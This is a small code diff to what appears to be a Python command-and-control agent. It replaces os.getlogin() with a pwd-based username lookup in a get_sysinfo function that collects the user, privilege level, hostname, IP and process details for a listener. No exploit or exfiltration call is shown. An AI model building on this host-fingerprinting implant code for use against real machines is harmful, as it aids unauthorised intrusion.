@@ -8,6 +8,7 @@ import copy
 import sys
 import struct
 import os
+import pwd
 import hashlib
 import random
 import string
@@ -585,7 +586,8 @@ def post_message(uri, data):
 def get_sysinfo():
 
     # listener | username | high_integrity | hostname | internal_ip | os_details | process_id | py_version
-    username = os.getlogin()
+    #username = os.getlogin()
+    username = pwd.getpwuid(os.getuid())[0] 
 
     uid = os.popen('id -u').read().strip()
     highIntegrity = "True" if (uid == "0") else False
